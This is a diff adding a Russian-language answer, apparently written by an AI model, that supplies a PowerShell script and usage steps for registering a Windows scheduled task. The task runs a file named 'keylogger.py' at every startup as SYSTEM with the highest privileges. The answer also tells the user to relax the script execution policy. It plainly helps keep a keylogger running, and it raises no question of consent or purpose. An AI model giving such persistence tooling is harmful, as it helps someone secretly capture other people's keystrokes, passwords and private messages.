@@ -1,0 +1,60 @@
+Да, вы можете создать PowerShell-скрипт (`.ps1`), который автоматизирует процесс добавления задачи в Планировщик задач Windows. Вот пример PowerShell-скрипта:
+
+### Пример `.ps1` файла
+
+```powershell
+param (
+    [string]$TaskName = "Keylogger",
+    [string]$PythonPath = "C:\Path\To\python.exe",
+    [string]$ScriptPath = "C:\Path\To\keylogger.py"
+)
+
+# Проверка наличия Python
+if (!(Test-Path $PythonPath)) {
+    Write-Host "Ошибка: Python не найден по пути $PythonPath" -ForegroundColor Red
+    exit
+}
+
+# Проверка наличия скрипта
+if (!(Test-Path $ScriptPath)) {
+    Write-Host "Ошибка: Скрипт не найден по пути $ScriptPath" -ForegroundColor Red
+    exit
+}
+
+# Создание команды для выполнения
+$Action = New-ScheduledTaskAction -Execute $PythonPath -Argument "`"$ScriptPath`""
+$Trigger = New-ScheduledTaskTrigger -AtStartup
+$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+
+# Создание задачи
+try {
+    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -User "NT AUTHORITY\SYSTEM" -RunLevel Highest
+    Write-Host "Задача '$TaskName' успешно создана!" -ForegroundColor Green
+} catch {
+    Write-Host "Ошибка при создании задачи: $_" -ForegroundColor Red
+}
+```
+
+---
+
+### Как использовать PowerShell-скрипт
+
+1. Сохраните код в файл с расширением `.ps1`, например, `create_task.ps1`.
+2. Убедитесь, что путь к `python.exe` и вашему скрипту указаны правильно.
+3. Запустите PowerShell **от имени администратора**.
+4. Выполните команду:
+   ```powershell
+   .\create_task.ps1 -TaskName "Keylogger" -PythonPath "C:\Path\To\python.exe" -ScriptPath "C:\Path\To\keylogger.py"
+   ```
+   Или просто измените параметры внутри скрипта и запустите его.
+
+---
+
+### Примечания
+
+- **Права администратора** обязательны, так как задача добавляется в Планировщик.
+- Вы можете редактировать скрипт для других триггеров, например, запускать задачу в определённое время. Для этого измените параметры `New-ScheduledTaskTrigger`.
+- Если `.ps1` не запускается, убедитесь, что политика выполнения скриптов разрешает запуск:
+  ```powershell
+  Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
+  ```
